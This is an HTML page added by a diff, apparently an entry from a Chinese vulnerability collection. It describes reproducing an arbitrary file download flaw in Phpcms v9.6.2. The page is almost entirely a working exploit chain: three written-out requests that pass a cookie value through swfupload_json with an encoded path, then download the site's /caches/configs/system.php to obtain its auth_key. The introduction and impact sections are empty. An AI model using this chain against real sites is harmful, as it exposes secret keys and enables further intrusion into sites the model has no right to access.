@@ -1,0 +1,43 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="phpcms-v962-任意文件下载"><span class="csDE05BCC">Phpcms v9.6.2 </span><span class="csECDA2D3">任意文件下载</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h5 class="cs868C439D">
+			<a name="第一步进行如下请求获得ydvibsiteid的值。"><span class="cs1C2E50E7">第一步</span><span class="cs4B51D5E4">:</span><span class="cs1C2E50E7">进行如下请求获得</span><span class="cs4B51D5E4">YDVIB_siteid</span><span class="cs1C2E50E7">的值。</span></a></h5>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">[GET]http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">获得：</span></p><p class="cs3A447A38"><span class="cs9FB05234">[cookie]YDVIB_siteid:75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst</span></p><h5 class="cs868C439D">
+			<a name="Xa319a35f0c9d6c7f3c693cdf6e59bdfec2c84e7"><span class="cs1C2E50E7">第二步</span><span class="cs4B51D5E4">:</span><span class="cs1C2E50E7">在</span><span class="cs4B51D5E4">[POST DATA] </span><span class="cs1C2E50E7">中的</span><span class="cs4B51D5E4">userid_flash</span><span class="cs1C2E50E7">参数的值设置为，第一步请求得到的</span><span class="cs4B51D5E4">YDVIB_siteid</span><span class="cs1C2E50E7">参数的值，并进行如下请求。</span></a></h5>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">[GET] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&amp;aid=1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">[POST DATA] userid_flash=75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">获得：</span></p><p class="cs3A447A38"><span class="cs9FB05234">[cookie] YDVIB_att_json:ea6fUlmiupVPoK2udMAztI7dpqUURRW1plemEGmRhGPocAvwWbcMk3BARFHzxLI4NJrV1IJQ2PaHeec790iDdhRJ9dJbhEKamgM55SwKR-F3fFmmWDOVuHnyiWg9kyMzQ2l9D_cRPQmM7P9e7ZYrESNQwjMOytrFTIhY4SFmK2Vjc3GS3g</span></p><h5 class="cs868C439D">
+			<a name="Xbbb1abfa0fcbdc2d1b581715d6244ba1f9709ac"><span class="cs1C2E50E7">第三步</span><span class="cs4B51D5E4">:</span><span class="cs1C2E50E7">将</span><span class="cs4B51D5E4">GET</span><span class="cs1C2E50E7">请求中的</span><span class="cs4B51D5E4">a_k</span><span class="cs1C2E50E7">参数的值设置为第二步请求获得的</span><span class="cs4B51D5E4">YDVIB_att_json</span><span class="cs1C2E50E7">参数的值，并进行如下请求。</span></a></h5>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">请求：</span></p><p class="cs3A447A38"><span class="cs9FB05234">[get] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=41f4VsAhLvN8-4L1ntgSsuga4BrvYA5zcDo2bjiYB7RI98Qzj5D5k8dqqBfo7cUNwF3TGhz1SH-vPs3lIIQJYwHeF_u2b3QVfD2HIO3Gay68TAtz2rqYhX8XIeznWrTtOI24418KZUoTEAfnY4kZNtIajW-bqHRV1djqmEc1hSAwkIYWA9CPrw</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">获得：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM</span></p><h5 class="cs868C439D">
+			<a name="X23d5a99d0211cf08fe990448e80a59db5718a28"><span class="cs1C2E50E7">最后点击</span><span class="cs4B51D5E4">&rdquo;</span><span class="cs1C2E50E7">点击下载</span><span class="cs4B51D5E4">&rdquo;</span><span class="cs1C2E50E7">的按钮进行如下请求，便可以下载</span><span class="cs4B51D5E4">/caches/configs/system.php</span><span class="cs1C2E50E7">文件，得到里面的</span><span class="cs4B51D5E4">&rsquo;auth_key&rsquo;</span></a></h5>
+		<p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20v9.6.2%20%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd_files/image0.png" width="560" height="364" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://www.freebuf.com/column/158352.html"><span class="cs4B51D5E4">https://www.freebuf.com/column/158352.html</span></a></span></p></body>
+</html>
